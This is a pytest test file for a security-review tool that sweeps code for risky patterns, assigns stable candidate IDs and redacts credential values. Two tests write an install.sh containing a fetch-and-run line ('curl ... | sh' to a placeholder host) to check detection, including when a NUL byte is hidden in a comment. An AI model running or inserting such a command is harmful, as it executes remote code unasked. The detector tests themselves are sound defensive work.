"""The pattern sweep. BRIEF_M1.md §5, and the golden that makes NFR-3 real.

`STACK.md` §9 requires golden-file tests with byte comparison for every
generation script, and this is the first one that has a generator to compare.
The golden lives at `tests/golden/hits.jsonl` and is regenerated deliberately,
never repaired: a diff here means the fixture tree, the catalog or the window
definition changed, and each of those is a decision rather than a wobble.
"""

from __future__ import annotations

import os
import unicodedata
from pathlib import Path

import pytest

from secrev.catalog import Catalog, load
from secrev.inventory import glob_to_regex
from secrev.ledger import WINDOW_SPEC, excerpt, redact, to_jsonl
from secrev.sweep import applies, sweep

ROOT = Path(__file__).resolve().parent.parent
FIXTURES = ROOT / "tests" / "fixtures"
GOLDEN = ROOT / "tests" / "golden" / "hits.jsonl"


@pytest.fixture(scope="module")
def catalog() -> Catalog:
    return load(sorted((ROOT / "patterns").glob("*.yaml")))


# --- the golden ----------------------------------------------------------


def test_matches_the_golden_byte_for_byte(catalog: Catalog) -> None:
    """`read_bytes`: see the note in `tests/test_recon.py`. `read_text`
    translates CRLF to LF on the way in, so it cannot see the one difference
    this module's own docstring says must never re-identify a candidate."""
    produced = to_jsonl(sweep(FIXTURES, catalog))
    assert produced.encode("utf-8") == GOLDEN.read_bytes()


def test_two_runs_are_byte_identical(catalog: Catalog) -> None:
    """NFR-3, at the level the requirement is actually written about."""
    assert to_jsonl(sweep(FIXTURES, catalog)) == to_jsonl(sweep(FIXTURES, catalog))


def test_the_golden_covers_the_non_ascii_filename(catalog: Catalog) -> None:
    """`STACK.md` §9 requires at least one golden test to run against a
    non-ASCII filename, which is what keeps the NFC rule honest. Asserted here
    rather than assumed, because the fixture could be renamed by someone who
    does not know why it has that name."""
    files = {hit.file for hit in sweep(FIXTURES, catalog)}
    assert any("café" in name for name in files)


def test_records_are_sorted_and_the_order_is_total(catalog: Catalog) -> None:
    hits = sweep(FIXTURES, catalog)
    keys = [(hit.file, hit.line, hit.rule_id) for hit in hits]
    assert keys == sorted(keys)


# --- identity ------------------------------------------------------------


def test_adding_an_unrelated_file_changes_no_existing_id(tmp_path: Path, catalog: Catalog) -> None:
    """BRIEF_M1.md §7, and the reason `ids.py` was built before this module.
    An id derived from a traversal counter passes every test until something is
    inserted ahead of it."""
    (tmp_path / "b.py").write_text("result = eval(expression)\n", encoding="utf-8")
    before = {hit.id: (hit.file, hit.rule_id) for hit in sweep(tmp_path, catalog)}

    # Sorts ahead of b.py, so a counter-derived id would renumber.
    (tmp_path / "a.py").write_text("data = pickle.loads(payload)\n", encoding="utf-8")
    after = {hit.id: (hit.file, hit.rule_id) for hit in sweep(tmp_path, catalog)}

    assert set(before) < set(after)
    for identifier, value in before.items():
        assert after[identifier] == value


def test_an_edit_above_a_match_does_not_re_identify_it(tmp_path: Path, catalog: Catalog) -> None:
    """FR-4.5: a verification anchored only to a line number is lost the moment
    the content moves. The window is ±20 lines, so a change far enough above
    leaves the window untouched and the id with it."""
    tail = "\n" * 60 + "result = eval(expression)\n"
    (tmp_path / "m.py").write_text(tail, encoding="utf-8")
    before = [hit.id for hit in sweep(tmp_path, catalog)]

    (tmp_path / "m.py").write_text("import os\n" + tail, encoding="utf-8")
    after = [hit.id for hit in sweep(tmp_path, catalog)]

    assert before == after


def test_every_record_carries_the_window_spec(catalog: Catalog) -> None:
    """A later transition to `block-20` has to be an invalidation FR-4.6
    detects, not something someone remembers. It is not M4's: M4 gives
    `block-20` to structural records, which are new and re-identify nothing,
    and re-windowing this source is a milestone of its own (`STACK.md` §5)."""
    assert all(hit.window_spec == WINDOW_SPEC for hit in sweep(FIXTURES, catalog))


# --- D-6 -----------------------------------------------------------------


def test_two_rules_on_one_line_stay_two_records(tmp_path: Path, catalog: Catalog) -> None:
    """D-6: two questions earn two answers even when the answers rhyme. Never
    merged, never deduplicated by location."""
    (tmp_path / "both.py").write_text(
        'subprocess.run(f"x {n}", shell=True)  # eval(n)\n', encoding="utf-8"
    )
    rules = sorted(hit.rule_id for hit in sweep(tmp_path, catalog))
    assert "exec.shell_true" in rules
    assert "exec.dynamic" in rules


def test_two_identical_matches_on_one_line_stay_two_records(
    tmp_path: Path, catalog: Catalog
) -> None:
    (tmp_path / "twice.py").write_text("a = eval(x); b = eval(y)\n", encoding="utf-8")
    hits = [hit for hit in sweep(tmp_path, catalog) if hit.rule_id == "exec.dynamic"]
    assert len(hits) == 2
    assert hits[0].id != hits[1].id


# --- nothing concludes anything ------------------------------------------


def test_every_candidate_is_unresolved(catalog: Catalog) -> None:
    """FR-3.2 and P4. M1 asks; it does not answer."""
    assert {hit.status for hit in sweep(FIXTURES, catalog)} == {"unresolved"}


def test_no_record_carries_a_verdict_field(catalog: Catalog) -> None:
    """§5: emit only the M1 field set, and do not stub the rest of the PRD
    schema with placeholders. A stubbed `severity` reads as a severity."""
    emitted = set(vars(sweep(FIXTURES, catalog)[0]))
    assert emitted == {
        "id",
        "file",
        "line",
        "layer",
        "source",
        "rule_id",
        "precision",
        "question",
        "match_excerpt",
        "status",
        "catalog_version",
        "window_spec",
    }


# --- content handling ----------------------------------------------------


def test_line_numbers_are_against_the_original_for_crlf(tmp_path: Path, catalog: Catalog) -> None:
    """`STACK.md` §5: normalise CRLF before hashing, report line numbers against
    the original. A checkout with autocrlf on must not shift every line."""
    (tmp_path / "crlf.py").write_bytes(b"import os\r\nimport re\r\nresult = eval(x)\r\n")
    hits = sweep(tmp_path, catalog)
    assert [hit.line for hit in hits] == [3]


def test_crlf_and_lf_produce_the_same_ids(tmp_path: Path, catalog: Catalog) -> None:
    """The same content in two line endings is the same content, so it is the
    same candidate. This is the assertion that would fail if the window were
    hashed before normalisation."""
    (tmp_path / "a.py").write_bytes(b"import os\r\nresult = eval(x)\r\n")
    crlf = [hit.id for hit in sweep(tmp_path, catalog)]
    (tmp_path / "a.py").write_bytes(b"import os\nresult = eval(x)\n")
    lf = [hit.id for hit in sweep(tmp_path, catalog)]
    assert crlf == lf


def test_nfd_and_nfc_filenames_produce_identical_artifacts(
    tmp_path: Path, catalog: Catalog
) -> None:
    """The NFC half of TASK-M1-010, verified locally.

    `tests/test_determinism.py` already asserts this for the *inventory*. This
    asserts it for the artifacts, which is where NFR-3's claim actually lands:
    a candidate id derives from `relative_path`, so a path that survived the
    walk in decomposed form would hand the same content a different identity on
    macOS than on Linux, and every verification recorded against it would
    expire on a machine change for no reason (D-4).

    Testable on ext4 because it stores the bytes it is given, so an NFD name can
    simply be written. What this cannot show is the platform fact underneath —
    whether APFS really hands back NFD for a name written NFC. That is the part
    that needs a macOS runner, and it is a claim about the filesystem rather
    than about this code.
    """
    body = "config = yaml.load(text)\n"
    composed = tmp_path / "nfc"
    decomposed = tmp_path / "nfd"
    for root, name in ((composed, "café.py"), (decomposed, "café.py")):
        root.mkdir()
        form = "NFC" if root is composed else "NFD"
        (root / unicodedata.normalize(form, name)).write_text(body, encoding="utf-8")

    # The two trees genuinely differ on disk; without that this proves nothing.
    written = [sorted(path.name for path in root.iterdir()) for root in (composed, decomposed)]
    assert written[0] != written[1]

    assert to_jsonl(sweep(composed, catalog)) == to_jsonl(sweep(decomposed, catalog))
    assert [hit.id for hit in sweep(composed, catalog)] == [
        hit.id for hit in sweep(decomposed, catalog)
    ]


def test_an_escaping_symlink_is_never_read_through(tmp_path: Path, catalog: Catalog) -> None:
    """Containment, asserted at the level where it would actually leak.

    `tests/test_determinism.py` asserts the *inventory* records an escaping
    symlink and marks it. This asserts the sweep never reads through one, which
    is the half with consequences: following it would pull content from outside
    the reviewed tree into `hits.jsonl` and into a `match_excerpt`, so a review
    of one directory would quote a file the reviewer never pointed it at.

    Cross-platform because symlink resolution is where the platforms differ
    most, and because the failure is silent — a followed link produces a
    perfectly ordinary-looking candidate.
    """
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.py").write_text("token = eval(untrusted_blob)\n", encoding="utf-8")

    target = tmp_path / "target"
    target.mkdir()
    (target / "ok.py").write_text("value = 1\n", encoding="utf-8")
    (target / "link.py").symlink_to(outside / "secret.py")

    hits = sweep(target, catalog)
    assert all("untrusted_blob" not in hit.match_excerpt for hit in hits)
    assert all(hit.file != "link.py" for hit in hits)


def test_ordering_does_not_depend_on_case_folding(tmp_path: Path, catalog: Catalog) -> None:
    """`STACK.md` §5 sorts on the POSIX string, which is case-sensitive.

    §4 makes case a finding class rather than a portability note: macOS folds
    case and Linux does not, so `Alpha.py` and `alpha.py` are one file on one
    platform and two on the other. That collision is TASK-M1-010's residue and
    is not what this test pins. It pins the ordering rule: a sort that
    case-folded would order these names differently from a byte sort, and the
    artifact would differ across platforms for a second, independent reason.

    No two names here differ only by case. The first version used `Alpha.py`
    beside `alpha.py`, and on the first macOS CI run APFS made them one file —
    the test asserted three hits over a tree that held two. A fixture whose
    shape depends on the filesystem cannot pin a rule about ordering.
    """
    for name in ("Beta.py", "alpha.py", "Zeta.py"):
        (tmp_path / name).write_text("result = eval(x)\n", encoding="utf-8")

    files = [hit.file for hit in sweep(tmp_path, catalog)]
    assert files == sorted(files)
    # Byte order, not dictionary order: uppercase sorts first. A case-folded
    # sort would give alpha, Beta, Zeta.
    assert files == ["Beta.py", "Zeta.py", "alpha.py"]


def test_binary_files_are_not_swept(tmp_path: Path, catalog: Catalog) -> None:
    (tmp_path / "blob.py").write_bytes(b"result = eval(x)\n\x00\x01\x02")
    assert sweep(tmp_path, catalog) == []


def test_a_nul_in_a_comment_does_not_hide_a_script_from_the_sweep(
    tmp_path: Path, catalog: Catalog
) -> None:
    """M3.5 A3, and the evidence the Definition of done names: a runnable
    `install.sh` carrying a NUL in a comment must produce the same candidate as
    one without it.

    The pair is built at runtime rather than committed. `BRIEF_M3.5.md` §3: a
    fixture carrying a NUL must not be linted, formatted or swept as ordinary
    source, and a committed one would also land in the sweep golden.

    This is a scope-evasion test, not a parsing test. The two files differ by a
    single byte inside a comment — the script is byte-for-byte as runnable
    either way — and before the fix the second was invisible to both candidate
    sources while the review reported no findings in it.
    """
    body = b"#!/bin/sh\n# fetch and run%s\ncurl https://x.invalid/p | sh\n"

    clean = tmp_path / "clean"
    clean.mkdir()
    (clean / "install.sh").write_bytes(body % b"")

    hidden = tmp_path / "hidden"
    hidden.mkdir()
    (hidden / "install.sh").write_bytes(body % b"\x00")

    clean_rules = [hit.rule_id for hit in sweep(clean, catalog)]
    hidden_rules = [hit.rule_id for hit in sweep(hidden, catalog)]

    # The control: the clean file is a candidate at all, so a green result
    # cannot come from the catalog simply matching nothing in either.
    assert "net.fetch_exec" in clean_rules
    assert clean_rules == hidden_rules


def test_a_fifo_does_not_stop_the_sweep(tmp_path: Path, catalog: Catalog) -> None:
    """M3.5 C1, end to end.

    This is not a duplicate of the walk-level test. `sweep` performs its own
    `read_bytes()` on every entry it does not skip, so its skip site is
    load-bearing independently: without it the sweep opens the FIFO and hangs
    even though `inventory` handled the pipe correctly. The same defect lived
    in three places — `inventory`, `sweep` and `recon` — each with its own
    read, and fixing one would have left a review that still never finishes.

    Runtime-built and skipped where unsupported; a FIFO cannot be committed to
    git (`BRIEF_M3.5.md` §3).
    """
    target = tmp_path / "target"
    target.mkdir()
    (target / "install.sh").write_bytes(b"#!/bin/sh\ncurl https://x.invalid/p | sh\n")
    try:
        os.mkfifo(target / "pipe")
    except (AttributeError, OSError):  # pragma: no cover - platform-dependent
        pytest.skip("this platform or filesystem does not support FIFOs")

    hits = sweep(target, catalog)

    assert [hit.file for hit in hits] == ["install.sh"]
    assert "net.fetch_exec" in [hit.rule_id for hit in hits]


# --- G-3 -----------------------------------------------------------------


def test_credential_values_are_redacted_not_the_names() -> None:
    """G-3. The name is what makes the finding legible; the value is what must
    never be reproduced."""
    out = redact('password="hunter2correcthorse"')
    assert "hunter2correcthorse" not in out
    assert "password" in out
    assert "[REDACTED]" in out


def test_long_opaque_strings_are_redacted() -> None:
    """The literal below is deliberately *not* shaped like a real provider
    token. An earlier version used a `ghp_`-prefixed string and the secrets
    stage flagged it four times — correctly, since a scanner cannot tell a
    convincing fake from the real thing, and that is the property that makes it
    useful. Committing realistic-looking credentials to prove a redactor works
    trains people to wave the scanner through. The rule under test keys on
    length and alphabet, so a neutral string exercises it identically."""
    opaque = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5"
    out = redact(f"Authorization: {opaque}")
    assert opaque not in out
    assert "[REDACTED]" in out


def test_excerpt_is_capped() -> None:
    assert len(excerpt("y = " + "ab" * 400, 0, 800)) <= 200


# --- G-3, the M3.5 group B findings --------------------------------------
#
# Every case below leaked against the pre-M3.5 redactor, and each was
# reproduced before it was written down (BRIEF_M3.5.md §3).
#
# None of these values is credential-shaped, for the reason the two tests
# above already record: a convincing fake trains people to wave the secrets
# stage through. In particular the API-key case deliberately carries no `sk-`
# prefix — the rule under test keys on the *name* beside the value, so a
# neutral value exercises it identically.


@pytest.mark.parametrize(
    ("line", "value", "name"),
    [
        # B1, first half: `\b` cannot match between `_` and `P`, so the key
        # never matched at all and the value was copied out verbatim. This is
        # the single most common real spelling of a credential in a config.
        ("DB_PASSWORD=hunter2hunter2", "hunter2hunter2", "DB_PASSWORD"),
        ("OPENAI_API_KEY=notarealkeyvalue", "notarealkeyvalue", "OPENAI_API_KEY"),
        ("AWS_SECRET_ACCESS_KEY: hunter2hunter2", "hunter2hunter2", "AWS_SECRET_ACCESS_KEY"),
        # The suffix form, to show the fix is not just a prefix allowance.
        ("password_value = hunter2hunter2", "hunter2hunter2", "password_value"),
        # B1, second half: JSON puts a closing quote between the key and the
        # colon, and the separator did not allow one — so the commonest
        # serialised form of a secret went straight into the ledger.
        ('{"password": "hunter2hunter2"}', "hunter2hunter2", "password"),
        ('{"apiKey":"notarealkeyvalue"}', "notarealkeyvalue", "apiKey"),
        # Quoted value beside an underscored name: both halves at once.
        ('OPENAI_API_KEY="notarealkeyvalue"', "notarealkeyvalue", "OPENAI_API_KEY"),
    ],
)
def test_the_review_forms_are_redacted(line: str, value: str, name: str) -> None:
    """B1. A table over the forms the external review used.

    The two rules were assumed to cover for each other and cover different
    things: none of these values reaches `_LONG_OPAQUE`'s 32-character floor,
    so when the key rule missed, nothing else caught it.
    """
    out = redact(line)
    assert value not in out
    assert "[REDACTED]" in out
    # G-3 redacts the value, never the name — the name is what makes the
    # finding legible to whoever reads the ledger.
    assert name in out


def test_a_name_that_merely_contains_a_keyword_is_not_an_assignment() -> None:
    """The widened key must not turn every mention of a credential into a
    redaction. `log.sensitive`'s own negative fixture is this line, and a
    subscript is a read, not an assignment."""
    assert redact('value = config["api_key"]') == 'value = config["api_key"]'


def test_a_credential_cut_by_the_cap_is_still_redacted() -> None:
    """B2. Redaction runs *before* truncation.

    This replaces a test that asserted the opposite and passed for a reason
    unrelated to the property it claimed: it truncated a 400-character run to
    200, leaving ~196 characters — still far above `_LONG_OPAQUE`'s floor — so
    it would have stayed green with the ordering either way.

    The case it could not see is the one that matters. A 40-character
    credential straddling the 200-character cap is cut to 20, drops below the
    floor, and stops being redactable at all. PRD G-3 says a credential is
    "never reproduced"; twenty characters of one is a reproduction.

    The filler is `. ` rather than letters so that it forms no
    credential-shaped run of its own, leaving exactly one thing in the line
    for the redactor to find.
    """
    line = "x = " + ". " * 88 + "B" * 40
    assert len(line) == 220
    out = excerpt(line, 0, len(line))
    assert "B" * 20 not in out
    assert "BBBB" not in out
    assert "[REDACTED]" in out


def test_a_credential_cut_by_the_margin_is_still_redacted() -> None:
    """B2, by the other mechanism. The ±24-character margin cuts as surely as
    the 200-character cap does, and below the floor the result is the same.

    Here the match is `eval(x)` and the credential sits past the margin, so
    the old slice reproduced its first eight characters and redacted nothing.
    The margin and the cap are one finding, not two: both shorten a secret
    until the rule that would have caught it can no longer measure it.
    """
    line = "eval(x)  # deploy key: " + "C" * 40
    out = excerpt(line, 0, 7)
    assert "CCCCCCCC" not in out
    assert "[REDACTED]" in out


# --- scoping -------------------------------------------------------------


def test_language_scoped_rule_skips_other_languages(catalog: Catalog) -> None:
    python_rule = next(item for item in catalog.patterns if item.id == "exec.shell_true")
    assert applies(python_rule, "app/main.py")
    assert not applies(python_rule, "README.md")


def test_unscoped_rule_applies_to_any_text(catalog: Catalog) -> None:
    any_text = next(item for item in catalog.patterns if item.id == "net.bind_all")
    assert applies(any_text, "README.md")
    assert applies(any_text, "deploy/compose.yaml")


@pytest.mark.parametrize(
    ("glob", "path", "expected"),
    [
        ("tests/**", "tests/a/b.py", True),
        ("tests/**", "tests/x.py", True),
        ("tests/**", "src/x.py", False),
        ("**/test_*.py", "test_x.py", True),
        ("**/test_*.py", "a/b/test_x.py", True),
        ("**/test_*.py", "a/b/x.py", False),
        ("*.py", "x.py", True),
        ("*.py", "a/x.py", False),
    ],
)
def test_glob_semantics_are_the_ones_a_reader_expects(glob: str, path: str, expected: bool) -> None:
    """Neither `fnmatch` nor `PurePath.match` gives these answers on 3.11, so
    the translation is explicit and pinned here. The choice is visible in every
    golden file."""
    assert bool(glob_to_regex(glob).match(path)) is expected
